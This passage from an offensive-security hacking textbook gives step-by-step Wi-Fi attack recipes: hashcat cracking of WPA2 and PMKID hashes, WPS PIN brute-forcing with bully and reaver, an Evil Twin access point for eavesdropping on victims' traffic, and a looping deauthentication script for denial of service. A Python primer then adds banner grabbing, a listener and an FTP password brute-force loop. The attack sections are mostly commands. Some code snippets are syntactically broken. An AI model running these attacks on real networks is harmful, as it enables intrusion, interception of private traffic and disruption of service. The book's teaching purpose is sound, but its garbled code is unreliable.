be a slow and tedious process, making your selection of a good wordlist
critical.
kali > hashcat –m 16800 HackersAriseCrack-01.cap
/root/top10000passwords.txt
If you are at first unsuccessful, go back to Chapter 8 and create a custom
wordlist for the target using ceWL, or cup, or crunch, or all three. With this
new custom wordlist, try once again to crack the hash with hashcat.

## Page 505

WPS
Many people who buy and use Wi-Fi APs technically challenged. For them,
setting up a Wi-Fi AP is a daunting task. To remedy this situation, the
industry developed a technology to make setting up a Wi-Fi AP as easy as
pushing a button! What could possibly go wrong?
The new technology became known as Wi-Fi Protected Setup or WPS. It
enabled the user to setup their Wi-Fi access point by simply pressing
abutton on the AP. This system relies upon a PIN being
transmitted between the AP and the client to initiate their “secure”
connection.
This PIN uses only digits from 0-9 (no special or alphabetic characters).
The PIN is eight characters long (all characters are digits), and the eighth
character is a checksum. To make matters worse, of these seven remaining
characters, the first four are checked, and the last three are checked
separately. This means that the number of possibilities is 104 (10,000) +
103 (1000) = 11,000 possible PIN’s! With that small number of PIN’s our
computer can test each of them in a matter of hours.
Although this vulnerability was mitigated with the development of WPS 2.0
in 2012, there are still a number of APs with WPS 1.0 and vulnerable to this
attack (I estimate about 10-20 percent)
The crack the WPS PIN, you will need the following information;
1. The name of your interface (usually wlan0mon)
2. The MAC Address of the AP
3. The ESSID of the AP
4. The channel that the AP is broadcasting on
We can gather all that information from our airodump-ng screen.
266 | P a g e

## Page 506


## Page 507

To find AP’s with WPS, you can run the wash command followed by the
name of your interface
(wlan0mon).
kali > wash –i wlan0mon
As you can see above, there were a number of APs available near my office,
and of those, one is still using WPS 1.0 (NTGR_VMB_1462061001).
Now, with the information from wash and airodump-ng, we can brute force
the PIN with either
bully or reaver.
To use bully, enter:
267 | P a g e
kali > bully wlan0mon –b 00:11:22:33:44:55 –e
NTGR_VMB_1462061001–c 11
To use reaver enter:
Kali > reaver –i wlan0mon –b 00:11:22:33:44:55 –vv
Make certain that you replace the MAC address with the actual MAC
address of the target AP, the actual SSID of the target AP, and the actual

## Page 508

channel the AP is broadcasting on.
Evil Twin Attack (MiTM)
Sometimes, rather than attacking the AP password, the attacker wants to
view all the target’s traffic. In other words, the attacker wants to
“eavesdrop” on their traffic. Eavesdropping might reveal passwords on
other accounts, credit card numbers, or confidential meetings and plans.
One way of doing that is to create an Evil Twin AP. The Evil Twin is an AP
with the same SSID as the target AP. If the attacker can get the target to
connect to their Evil Twin AP, then all the traffic will traverse the attacker’s
computer. This enables the attacker to eavesdrop (listen) to the target’s
traffic and even alter the messages.
Build our Evil Twin
Let’s start building our Evil Twin. To do so, we need another tool from the
aircrack-ng suite, airbase-ng. It converts our Wi-Fi adapter into an AP,
broadcasting, and accepting client connections. We will also need two
network interfaces. Here, I will be using my Alfa card as an AP and
Ethernet connection (eth0) to connect to the Internet.
kali > airbase-ng –a aa:bb:cc:dd:ee:ff --essid hackers-arise –c 6
wlan0mon
268 | P a g e

## Page 509

Where:
aa:bb:cc:dd:ee:ff
is the MAC address of the new Evil Twin AP
--essid hackers-arise is the name of the Evil Twin AP
-c 6
is the channel we want it to broadcast on
wlan0mon
is the interface we want to use as an AP
Now that we have our wireless card up as an AP, let’s check our system
again for wireless extensions with iwconfig.
kali > iwconfig
As you can see, we now have a new wireless interface, at0, but with no
wireless extensions. We need to fix that.
We need to build a tunnel from at0 to our Ethernet interface (eth0) so that
when someone connects to our AP (at0), their traffic traverses our system
and out to the Internet via the eth0. The next set of four commands does
exactly that !
269 | P a g e

## Page 510

kali > ip link add name ha type bridge
kali > ip link set ha up
kali > ip link set eth0 master ha
kali > ip link set at0 master ha
Now that we have built our tunnel let’s run ifconfig again.
As you can see, we now have a tunnel named ha (hackers-arise) that takes
traffic from at0 (our AP) to our Ethernet connection and out to the Internet.
In this way, whenever anyone connects to our AP, their traffic goes through
our system and then out to the Internet totally transparently.

## Page 511

We now need to set up a DHCP server (it assigns IP addresses to those who
connect) to the tunnel we created.
kali > dhclient ha &
270 | P a g e

## Page 512

This starts the DHCP service (dhclient) on our tunnel (ha) and then puts the
service into the
background (&).
To get the clients to connect to our new Evil Twin AP, we need to knock
them off the legitimate AP. We can do this the same way we did above in
our WPA2 attack.We use the aireplay-ng command and
send de-authentication frames into the AP (sometimes, this can DoS some
of the older AP hardware).
This will make the legitimate AP unavailable to the clients, and they will
connect to the Evil Twin instead!
kali > aireplay-ng –deauth 1000 aa:bb:cc:dd:ee:ff wlan0mon –ignore-

## Page 513

negative-one
Now open Wireshark (see Chapter 10 on Sniffers). When the clients
reconnect to your Evil Twin, their traffic traverses unencrypted through
your system. You should be able to view it in Wireshark.
Notice that when you open Wireshark, a new interface—our tunnel “ha”—
appears in the GUI. Click on that interface to collect the packets traversing
our tunnel.
You can now view all of the client’s traffic in Wireshark!
271 | P a g e

## Page 514


## Page 515

To follow a stream of one client, right-click on a packet in the upper
window and then click on “Follow Stream.”
Now you should be able to see and read all that client’s traffic! (for more on
using Wireshark to analyze traffic, go to https://www.hackers-
arise.com/single-post/2018/09/24/Network-Forensics-Wireshark-
Basics-Part-1).
272 | P a g e

## Page 516

Denial of Service (DoS) Attack
As we have seen, there is a Wi-Fi protocol frame known as the de-
authentication (deauth) frame. It can be used to knock users off the AP. We
used it above to de-authenticate users forcing them to re-authenticate in the
WPA2-PSK attack and knock out the legitimate AP in the Evil Twin hack.
We can also use that frame and aircrack-ng suite to create a Denial of
Service (DOS) against the AP.
We can simply use this command to knock users off the AP. As I mentioned
earlier, in some older AP’s this will knock out the AP entirely and forcing
the admin to reboot the AP.
To do so, we simply need to enter:
kali > aireplay-ng –deauth 100 –a <BSSID> wlan0mon
This will knock everyone off the AP during the duration of the sending of
the deauth frames. They can reconnect then afterward. What if we wanted
to keep the AP offline indefinitely? We could keep running this command
over and over again OR we could summon up our BASH scripting skills
(for BASH
scripting, see Linux Basics for Hackers ) to create a simple script that kept
running this command at regular intervals.
This simple BASH script periodically sends these de-authenticate (deauth)
frames to the AP, thereby knocking all the clients off and disrupting their
Internet access. Then, we put our attack to “sleep” for a period of time and
restart the attack, knocking everyone off again.
To do so, open Leafpad or any text editor and enter the following;
273 | P a g e

## Page 517

Line #1 -
declares that this is a BASH script
Line #3 -
starts a for loop starting with one and running through until 5000 iterations
Line #5 -
begins the do
Line #7 -
is our aireplay-ng command that sendsthe deauth frames to the selected AP
BSSID

## Page 518

Line #9 -
puts the script to sleep for sixty seconds
Line #11 -
completes the do
The script will then send deauth frames to the AP every 60 seconds for 5000
iterations or about three days! Of course, for shorter or longer periods of
time, simply adjust the second number in the for clause (5000).
PMKID Attack
In August 2018, the developers of hashcat announced they had found a new
attack against WPA2-
PSK. As we saw above, the cracking of WPA2-PSK involves temporarily
disconnecting a client from the AP in order to get them to reconnect, where
we then capture the hash in the 4-way handshake. The good folks at hashcat
found that they could get the password hash without the need for a client to
connect, saving us one step and significant time and trouble.
The PMKID attack is capable of getting the information for the WPA2-PSK
brute force password attack by grabbing a single frame. That frame, the
RSN IE, contains all the information we need, and it doesn’t require a client
to connect!
How It Works
When your wireless network adapter starts up, your system begins to look
for known networks to connect to. It ”probes” for known SSID’s to connect
to. If the AP is in range, the AP will respond to the probe.
The AP response is the RSN (Robust Security Network). Your network
adapter then responds withan 274 | P a g e

## Page 519

Authentication Request (AR). The Authentication Request prompts the AP
to send its own authentication frames. When the W-Fi adapter receives this
authentication request, it will send an Association Request to the AP with
ESSID and RSN. The AP responds with an EAPOL frame that may contain
the PMKID. This
PMKID contains:
1. PMK
2. PMK Name
3. AP’s MAC Address
4. Stations MAC Address
All this information is then hashed through the HMAC-SHA1-128
algorithm. This attack is successful by grabbing the PMKID, stripping out
all the information but the password hash, and then running that hash
through a hash cracker, such as hashcat.
Let’s get started!
The tools we need for this attack are not built into Kali by default, so we
will need to download them from github and build them.
First, we need the hcxdumptool. Using git clone, we can download it from
www. github.com by
entering;

## Page 520

kali > git clone https://github.com/ZerBea/hcxdumptool.git
Then, navigate to the new hcxdumptool directory;
kali > cd hcxdumptool
..and make and install this tool.
kali >make
kali >make install
275 | P a g e
Next, we need the hcxtools. Just like the hcxdumptool above, we can
download and install it by
entering;
kali > git clone https://github.com/ZerBea/hcxtools.git
kali >cd hcxtools
kali >make
kali >make install
We now need to place our wireless adapter into monitor mode again.

## Page 521

kali >airmon-ng start wlan0
With the wireless adapter in monitor mode, we can now probe the available
AP’s for their PMKID.
kali >hcxdumptool –I wlan0mon –o HackersArisePMKID –enable_status=1
276 | P a g e
As you can see above, hcxdumptool is capable of pulling the PMKID from
many of the Wi-Fi AP’s in the area. It likely won’t be able to pull all of
them, but it usually can pull most of them (80-90 percent).
Note that our capture file has multiple PMKID’s. It’s likely we only want to
crack the PSK of one AP. To do so, let’s run the hcxdumptool with a filter
for just a single the target AP. Go back to our
airodump-ng terminal and select the BSSID of the target AP. Then create a
simple text file with the BSSID of the target AP. We can use cat to create a
simple text file named “targetBSSID’.

## Page 522

Make certain that the file does not contain any colons “:” or spaces.
kali > cat > targetBSSID <the target AP’s BSSID>
Exit cat by entering CTRL+D.
Now that we have the BSSID into a plain text file, we can use it in
hcxdumptool filter for that target AP and place the target’s PMKID into our
output file.
To do so, enter:
kali > hcxdumptool –I wlan0mon –o HackersArisePMKID –
enable_status=1 –
filterlist_ap=targetBSSID –filtermode=2
277 | P a g e
As you can see above, hcxdumptool focused just upon that one AP and
placed the PMKID into our file

## Page 523

“HackersArisePMKID”!
Convert Dump to Hashcat Format
To convert the HackersArisePMKID file into a format that hashcat can
work with, we need to use
the hcxcaptool. Make certain you are in the same directory as the
HackersArisePMKID file and
enter:
kali > hcxcaptool –z hashoutput.txt HackersArisePMKID
Now that we have stripped out all the superfluous information, we can send
this hashoutput.txt file to hashcat and crack it! Note the –m 16800 in this
command represents the appropriate hash
algorithm for this hash.
kali > hashcat –m 16800 hashoutput.txt top10000passwords.txt
278 | P a g e
Social Engineering WPA2-PSK Password
In some cases, the best route to obtain the WPA2-PSK password is to social
engineer it from the user. A sophisticated social engineering attack can be
VERY effective against most people. Fortunately, we have a tool for just
that purpose named wifiphisher. In Chapter 17, Social Engineering, I’ll
show you how to use it to get the end-user to volunteer their Wi-Fi
password to you!
Summary
Wi-Fi or IEEE 802.11 is still fertile ground for hacking after twenty years of
patching and security upgrades. It’s critical that the attacker selects the
proper strategy to be successful and not waste their time and resources. The
WPA2-PSK attacks using the 4-way handshake, or PMKID can be very

## Page 524

time-consuming. If the AP has WPS enabled, this attack by bully or
REAVER can take just a few hours (it only requires 11,000 attempts). If all
you need is to eavesdrop on the target’s Wi-Fi traffic, the Evil Twin attack
can be very effective.
If you are unsuccessful in obtaining the password by these attacks, consider
the social engineering attack in Chapter 17.
Exercises
1. Put your wireless network card in monitor mode. Note its name change.
2. Follow the steps above to obtain the 4 way handshake between the Wi-Fi
client and
the AP. Now, crack that password with hashcat.
3. Build the Evil twin attack above and watch the target’s wi-fi traffic.
4. Scan your area for AP’s with WPS 1.0. When you find one, use bully or
Reaver to
crack the PIN.
279 | P a g e

## Page 525

1 6
Malicious Python
The will to succeed is important, but what's more important is the will to
prepare.
Bobby Knight
Some basic scripting skills are essential to becoming a
master hacker. Without the ability to write your own scripts, you
will be relegated to using tools developed by others. There is
nothing wrong with borrowing from others, but once a tool has been
developed, its efficacy and value declines by the minute. As soon as
hackers develop a new tool, AV, firewall, and IDS developers begin
280 | P a g e

## Page 526

to detect its behavior and signature, making it less effective. As you develop
and refine your scripting skills, you can advance to the upper echelons of
hackers!
Although there are many programming languages, Python is the choice for
most hackers. If you take a look at the tools in your Kali Linux, most are
written in Python, including sqlmap, p0F, recon-ng, wpscan, and many
others. Furthermore, well-known applications such as YouTube, Dropbox,
Instagram, and
Spotify are all written in Python. This is likely because Python is simple,
efficient, and has innumerable third-party libraries (small pieces of reusable
code). These libraries provide Python functionality like no other scripting
language. You can build hacking tools in other languages, but Python’s
modules make it much faster and easier.
Before we move into writing our Python scripts, let’s address some
important preliminaries:
1. Python Modules
2. Pip
3. Object-Oriented Programming
Python Modules
When you install Python, you also install its set of standard libraries and
modules that provide you with an extensive range of capabilities. These
include built-in data types, exception handling, numeric and math modules,
file handling, cryptographic services (critical to hacker and information
security pros), internet data handling, and interaction with internet
protocols.
Despite all the power offered by these standard libraries and modules, you
may need additional third-party modules. In Python, third-party modules
are extensive and one of the primary reasons hackers prefer Python to other

## Page 527

programming languages. You can find a comprehensive list of third party-
modules at PyPI (the Python Package Index, shown below)
Pip
Python has its own package manager (like rpm or apt) specifically for
installing and managing Python packages known as pip (Python Installs
Packages). Since everything in this chapter is using Python3, you will need
pip for Python3 to download and install packages. You can download and
install pip from the Kali repository by entering the following:
kali > apt install python3-pip
Then, to download a particular package from PyPI repository, you can
simply enter:
kali > pip3 install <package name>
When you download these packages from the PyPI repository via pip3, they
are automatically placed in the /usr/local/lib/python3/dist-packages
directory on your Kali system. So, for
281 | P a g e
instance, if you had used pip to install the Python implementation of the
SNMP protocol, you would find it at /usr/local/lib/python3.6/pysnmp. If
you aren’t sure where your package has been

## Page 528

placed, you can enter pip3 followed by the show and the package name, as
seen below:
kali> pip3 show pysnmp
Object-Oriented Programming
Before we delve into Python, it’s probably a good idea to take some time to
discuss the concept of object-oriented programming or OOP. Python, like
many modern programming languages, uses this model. If you have
experience with another OOP language and understand these concepts, you
can safely skip to the next section. If not, take a minute to read this section,
as it will likely make your journey into Python a bit easier.
In the figure below, we illustrate the concept of the OOP model. As you
might surmise, OOP revolves around the concept of an object. The object
has properties in the form of attributes and states, as well as methods that
are actions performed by or on the object.
The idea behind OPP programming is to create objects that act like things in
the real world. For example, a car is an object that has properties, such as its
wheels, color, size, and an engine. That same car has methods, which are
the actions the car takes, such as accelerating, starting, stopping, and
locking. From the perspective of natural language, an object is a noun, a
property is an adjective, and a method is a verb.
Objects then are members of a class, which is like a template for creating
objects with shared initial variables, properties, and methods. For example,
if we have a class called cars, our car (Audi) would be amember of the class
of cars. This class would also include other objects/cars, such as Toyota and
BMW.
282 | P a g e

## Page 529

Classes can also have subclasses. Our car class has an Audi subclass, and an
object of that subclass might be an Audi A8.
Each object would have properties (make, model, year, and color) and
methods (start, lock, drive, and park).
In OOP languages such as Python, objects inherit the characteristics of their
class; the AudiA8 would inherit the methods (start, lock, drive, and park)
from its class “car.”
These OOP concepts are critical to understanding how Python works, as
you will see as you progress through this chapter, and your Python skills
develop.
Getting Started
Now that we have some of the basics out of the way, let’s talk about some
basic programming concepts, terminology, and Python syntax. After that,
we will begin to write some simple scripts evolving to some more
sophisticated hacking scripts before the end of this chapter.
Just like BASH scripts, we can create Python scripts with any text editor
such as vim or Leafpad. As your scripts advance into greater complexity
and sophistication, you will likely find using an integrated development
environment, or IDE, useful. In this chapter, we will use one of the best
Python IDEs, PyCharm. IDEs are like text editors, but with additional

## Page 530

capabilities builtin, such as color-coding, debugging, and compiling
capabilities.
Although most IDEs will work in multiple programming environments,
PyCharm is designed exclusively to work with Python. This is an excellent
IDE with a lot of enhancements that will make your coding faster andmore
efficient. The professional version of PyCharm can be purchased, but we
will use the free community edition here. You don’t need to use an IDE to
follow on in this chapter, but it will help.
You can download PyCharm from https://jetbrains.com/pycharm/download.
O nce it has downloaded, you will need to navigate to the new PyCharm
directory, extract it, and then start PyCharm by executing the pycharm.sh
script.
283 | P a g e

## Page 531

This should open the PyCharm interface that looks like the figure below.
Variables
Let’s begin with some of the more practical concepts in Python. Like in
other programming languages, Python has variables. A variable is a name
associated with a particular value. Whenever you use that variable name in

## Page 532

a program, it uses the associated value. For instance, a variable called
“name” might contain the value “Occupytheweb.”
A variable name points to data stored in a memory location, which may
contain a value such as an integer, real number, string, floating point
number, Boolean value (TRUE or FALSE), list or dictionary (we’ll cover
these shortly).
284 | P a g e
To become familiar with variables, let’s create our first Python script. Open
your PyCharm IDE and create the following simple script you can call
first_simple_script.py.
The first line simply tells the system to use the python3 interpreter (Python3
is the latest Python, but many systems still use Python2.7 at this writing).
The second line defines a variable called name and assigns a value to it (in
this case, “Occupytheweb”). You can change this line to your name or any
name.
The value of this variable is in the string character data format, which
means the content is enclosed in quotation marks and is treated as text

## Page 533

(Note: in Python, single or double quotation marks are generally
interchangeable with some exceptions). You can put numbers in strings, but
they will be treated as text and not numbers.
The third line creates a print() statement concatenating (concatenate is
afancy word used in information technology, meaning “put together”)
“Greetings to ” with the value in the name variable followed by the text
“and Welcome to This Journey to Become a Master Hacker .” A print
statement will display whatever you pass to it within the parenthesis to the
screen.
Before you can execute this script, you need to give yourself permission to
execute it. You need to use the chmod command to do that.
kali > chmod 755 first_simple_script.py
Now, to execute the script, simply precede the script name with a period
and forward slash (./).
kali > ./first_simple_script.py
Success! You just completed a very basic script in Python!
285 | P a g e

## Page 534

In Python, each variable type is treated like a class. A class is a template for
creating objects (as we discussed in the earlier section on OOP. In the next
script, I will demonstrate a few different types of variables. Variables can be
more than just strings (text). They can hold several different data types.

## Page 535

This script creates five variables that contain different data types. These
include:
1. A string - treated as text;
2. An integer—a number without decimals;
3. A floating-point number—a number with decimals;
4. A list—a series of values stored together;
5. A dictionary—an unordered set of data each with its own key.
Dictionaries are useful when you want to refer to or change a value by
referring to a key name. For example, say you have a dictionary called cars
that contains your favorite model of each car manufacturer configured like
the following:
cars = {‘BMW’ : ’X6’, ‘ Mercedes’ : ‘GLC300’, ‘Tesla’: ‘Model X’,
‘Audi’ : ’Q3’}
Later, while writing your script and you may want to get your favorite
model of a particular car, you can simply call it by its key.
print (cars[BMW])
286 | P a g e
You can also change the values for particular keys. If you wanted to change
your favorite Tesla to the Model S, you would enter:
cars[‘Tesla’] : ‘Model S’

## Page 536

We will discuss lists and dictionaries in more detail later in this chapter.
Enter the script above in PyCharm and save it as secondscript.py. Give
yourself permission to execute it and then execute it as follows:
kali >./secondpythonscript.py
Comments
Like any programming language, Python has the capability to add
comments. Comments are simply text that is added to your code to help
explain what you are trying to do. These comments are NOT executed by
the interpreter. The Python interpreter sees the comments and simply skips
over it until it comes to another line of executable code.
Comments are not required in your scripts but are highly advisable. Imagine
coming back to your script six months or six years from now and trying to
determine what you were trying to accomplish. Moreover, imagine another
programmer trying to decipher your code five years from now. In both
cases, comments are mighty helpful and will save you both significant time
and frustration.
Python uses the “#” symbol to designate a single line of comment. When
you want to write multiline comments, you can use three double quotation
marks (’’’) to begin the comment and three double
quotation marks at the end.
As you can see below, I have enhanced our secondpythonscript.py with
some comments that
help explain what we were trying to do with this code.
287 | P a g e

## Page 537

When we execute the script again, nothing changes as the Python
interpreter simply skips over the comments and executes only the non-
commented lines.
Functions
Functions in Python (like other programming languages) are bits of code
that perform a designated action.They are like mini-programs within your
script. For instance, the print() statement we used above is a function that
displays whatever you pass to it in the script. There are a large number of
functions in Python that you can import and use. Most are available in your
default installation of Python, but there are numerous others available in the
downloadable libraries in Python.
Here is a brief sampling of available functions.
abs() – returns the absolute value of a number

## Page 538

ascii() – returns a string containing a printable representation of an object
bool() – returns a Boolean value
dict() – creates a new dictionary
help() – invokes the built-in help
hash () – returns the hash value of an object
max() – returns the largest value
hex() - converts an integer to hexadecimal
min() – returns the smallest value
round()- returns a rounded number
len() – returns the length of the object
sum() – sums the items of an iterable and returns the total
288 | P a g e
You can also create your own functions, but before you do so, make certain
that it has not already been created. You can check the official Python
documentation at https://docs.python.org .
To create your own function, use the def statement followed by the name
you want to use for the

## Page 539

function, such as if we wanted to create a function named “new_function”
we would enter:
def new_function
<Block of Code>
Lists
Most programming languages use what they refer to as arrays to store
multiple separate objects. These arrays are lists of values that can be
retrieved, deleted, replaced, and manipulated when referenced by an index [
]. In Python, arrays are known as lists.
It’s worth noting here that Python--like many other programming languages
—begins counting with 0.
The first element is element 0, the second element is element 1, and so
forth. This means that if you wanted to access the fourth element in a list,
you would do so with list[3].
Lists in Python are iterable. This means that the list can provide successive
elements when you run all the way through it (see Loops). This is useful
because quite often when we use lists, we are looking through the list for a
particular value such as a password list.
Let’s imagine you want to display the third element in our list in our
secondpythonscript.py (we created a list named HackersAriseList). We can
access that element and print it by calling the list’s name followed by the
index of the element in square brackets.
Let’s test this now on our script. On Line 27 of our script, change the index
in the square brackets to [2].
Now, run the script again.
kali > ./secondpythonscript.py
As you can see, this time, the script prints the number 3 from our list!

## Page 540

289 | P a g e
Modules
A module is simply a section of code saved into a separate file so that you
can use it as many times as you need without having to reenter all the code
again and again. If you want to use a module, you need to import it. As we
discussed earlier, using standard andthird-party modules is one of the key
strengths of Python, and these particular modules are why hackers prefer
Python. So, if we wanted to use the ftp module, we would import it.
import ftplib

## Page 541

Later in this chapter we will use this module and the socket module in our
ftp password cracking script.
Network Communications in Python
Before we move on to more advanced Python concepts, let’s use what we
learned so far to write a couple of scripts that may be useful to hackers and
information security professionals.
Building a TCP Client
In this script, we’ll create a simple TCP network connection in Python using
a very practical and widely used module named “socket.”Socket is among
those many modules in Python that can be used for a
multitude of tasks. Here we will be using the socket module to create our
simple TCP connection.
Let’s build the script seen below, and then we will analyze it here. This
script goes out and grabs the banner presented by the SHH protocol on port
22. A banner, as we saw earlier in Chapter 4 with Shodan, is an
“announcement” that an application makes when someone or something
connects to it. Hackers can use this technique for reconnaissance to
determine what application, and even what version of the application, is
running on a port. This is exactly what Shodan does. It grabs the banner
from every port and IP address and puts the banner information into a
database, indexes it, and allows us to search by that information.
290 | P a g e
In the first step, we need to import the socket module we referenced earlier.
Once it has been imported, we can then use its functions and tools. In this
script, we will use the socket module to create a connection over the

## Page 542

network for us. A socket is a module that enables two computer nodes to
communicate with each other. It uses the familiar server/client architecture.
In the next step, we create a variable and associate it with the socket class
from the socket module (Remember my earlier discussion on classes?). We
do this so we don’t have to reference the full socket.socket() syntax each
time we want to use it. Now we can simply use the variable name,
making our coding simpler and more efficient.
Next, we use the connect() method from the socket module to make a
network connection to a
particular IP address and port. Remember that methods are functions
available for a particular object. In Python, the syntax is object.method. In
this case, we are connecting to IP address 192.168.1.101 (use the IP address
of your Metasploitable 2 system) and port 22.
Once you make the connection, there are a number of things we can do. In
this script, we use the receive method recv to read 1024 bytes of data from
our socket (TCP connection) and store that information in avariable called
answer. The receive method takes the banner information and places it into
the variable.
Once the variable has the banner information, we will want to print it with
the printf() function. On thefinal line of the script, we close the socket.
Now, save this script as SSH BannerGrab.sh and give yourself permission
to execute it with chmod (chmod 755 SSHBannerGrab.sh). Lets now run
this script, and if the target system has SSH
running on port 22, it will make a TCP connection, receive the banner, place
the banner into a variable and print the contents of the variable as seen
below.
We have just created our first reconnaissance Python script!

## Page 543

As you can see, this script not only told us what application is running on
port 22, but also the version of the application (7.3p1) and the operating
system (Debian-1). In many cases, this information will be critical to the
hacker in determining what approach to take to hack the system!
Creating a TCP Listener
Now that we have created a TCP client that is capable of capturing the
banner information, let’s create a TCP listener. With that same socket
function, we can create a TCP listener that outsiders can connect to.
In our next Python script, we’ll create a socket on your system that enables
a connected listener to collect key information about their system. In other
words, when someone connects to our system, we will gather information
about them. (Every system that connects to a system carries with it nearly
unique information about itself.)
291 | P a g e

## Page 544


## Page 545

Enter the script below and save it as tcp_listener.py. Make sure to give
yourself execute
permission (chmod).
As usual, in the first line, we declare that we want this script to be run with
the Python interpreter. Then, we import the socket module again. We then
define variables to hold information for the TCP/IP address and port. Next,
we define a variable by defining the buffer size of the information we will
collect from their connection.
We then define the socket and bind the socket to the IP address and port
using the variables we just created. We tell the socket to listen for the

## Page 546

incoming connection by using the listen() method from the socket modules
library.
We then capture the IP address and port of the system that is connecting to
our socket and print this information to the user's screen with print().
Next, we use a while loop. We’ll discuss while loops in the next section, but
notice here that it will continue to run the indented code that follows
indefinitely as long as there is data (if not
data:break). This means that this script continues to run as long as there is
incoming data. When the data stops, so does this script.
292 | P a g e
Finally, we place the information into a buffer, print it, and close the
connection.
To test our script, first, execute the tcp_listener.py script and then go to
another computer on your network and connect to the port designated in our
script (5555). Our script will collect key information about the connecting
system and print it out.
This is, once again, key information a hacker needs before running an
exploit. As you learned earlier, exploits are very specific. They work only
for a particular operating system, application, port, version, and sometimes
even a particular language (i.e. MS14-054). This is all part of
reconnaissance, like we did in Chapter 4, and this script is very similar to
the passive operating system fingerprinting tool or p0F.
Dictionaries, Loops and Control Statements
Let’s continue to expand our knowledge and skills in Python and apply
them to additional hacking tools.
Dictionaries
Dictionaries hold information as unordered pairs. These pairs contain a key
and an associated value. We can use a dictionary to store a list of items and

## Page 547

give each item a label so we can refer to it individually.
For instance, we might store the key 1 with the value “Acura,” the key 2
with the value Audi, the value 3
with the value BMW, and so forth. In some systems, these dictionaries
might be used to store a USERID
(key) with the user password (value). Dictionaries in Python operate like an
associative array in many other languages.
Just like the lists we mentioned earlier, dictionaries are iterable. This means
that we can use a control structure such a for, if-else, or while to go through
each value in the dictionary. This is especially useful for creating password
crackers. We could create a script that tries every password in a file until it
comes to a correct password or exits.
The syntax for creating a dictionary looks like this;
dict = {key1:value1, key2:value2, key3:value3}
Note that with these dictionaries, we use curly braces{} and separate each
item with a comma. You can include as many key-value pairs as you want.
Control Statements
Control statements allow your script to make decisions based upon some
condition such as “as long as this condition evaluates to true, continue.
When it evaluates to false, stop.” There are many ways to control the flow
of our script in Python. We’ll look at some of the more important ones here.
293 | P a g e
The if Statement
The if control structure in Python is very similar to the if control statements
in other programming languages, including BASH (for more on BASH see
Linux Basics for Hackers ). An if statement is used to check whether a

## Page 548

statement is TRUE or FALSE and then run different code based upon the
results of that condition.. The syntax looks similar to this:
if <a conditional statement that evaluates to TRUE or False>
<code to run if statement above is TRUE>
The if statement contains a condition that might be something like:
if variable < 10
If the condition evaluates to TRUE, then the code that follows is executed.
If the statement evaluates to FALSE, then the next statements are skipped
and not executed.
The statement (s) that follow the if statement are referred to asthe control
block, and in Python, the control block must be indented. It is the
indentation that identifies the control block. The next statement NOT
indented is outside the control block and not part of the if statement. This is
how Python knows what lines of code to execute when the if evaluates to
TRUE and where to go to if it evaluates to FALSE.
If...else
In Python, the if..else structure looks like this;
if <conditional statement that evaluates to TRUE or FALSE>
<statements to run if TRUE>
else
<statements to run if FALSE>
As with the if statement, the Python interpreter checks to see whether the
condition following the if statement evaluates to TRUE or FALSE. If it
evaluates to TRUE, the statements in the control block are executed. If it
evaluates to FALSE, the statements in the control block after the else are
executed instead.

## Page 549

294 | P a g e
elif
A variation on the if...else statement is the elif statement. While the if...else
statement
allows you to execute one statement or block of code, there are times when
you may have many possible clauses to execute. The elif enables you to
nest multiple cases of possible outcomes and execute the appropriate
statement or block of code to the circumstance.
An elif follows an if or another elif. Elif is short for “else if.” In simpler
terms, the elif
enables you to provide another condition to evaluate if all the previous
conditions have evaluated to FALSE. It’s important to note that only one
block of code will be executed, so order matters!
if port==22
print(“This open port is running SSH”)
elif port==25
print(“This open port is running SMTP”)
elif port==53
print(“This open port is running DNS”)
elif port==80
print(“This open port is running HTTP”)
Loops
Loops can be a very useful structure in writing your Python scripts. Loops
enable us to repeat a code block multiple times, depending upon a value or

## Page 550

a condition (TRUE|FALSE). The two most commonly
used are while loops and for loops (we used a for loop in the tcp_listener
that continued to
run as long as there was data).
While Loops
The while loop evaluates a Boolean expression (TRUE or FALSE) and
continues execution while the
expression evaluates to TRUE. For example, we could create code snippet
that prints each number from 1
to 100 and then exits the loop.
Count =1
While (count<=100):
295 | P a g e
Print(count)
Count+=1
The indented control block then runs as long as the condition evaluates to
TRUE (count <=100). In the tcp_listener script, our while loop ran as long
as there was data.
If not data:break
The for Loop
The for loop can assign values from a list, string, dictionary, or other
iterable structure to an index variable each time through the loop, enabling
us to use each item in the structure one after another. For example, we
might use a for loop to attempt passwords until we find a match, such as:

## Page 551

For password in passwords;
Attempt = connect(username, password)
If attempt ==”230”
Print (Password found: “ + password)
Sys.exit(0)
In this code snippet, we create a for statement that continues through a list
of passwords we provide (see Chapter 8) and attempts to connect with a
username and password. In this case, if it receives a “230” code (success on
FTP servers), the program prints “Password found,” followed by the
password. It then exits (sys.exit). If it does not get the success code, it will
continue looping through each of the remaining passwords until it receives
a 230 or comes to the end of the password list.
Adding Capability to Our Scripts
Now that we know a bit more Python, let’s see whether we can use this
advanced knowledge to improve and expand our scripts. Let’s take our
SSHBannerGrab script and give it capabilities to grab more banners than
just SSH. Let’s add a list of ports to grab banners from and use a looping
structure to go through each element of the list and attempt to grab the
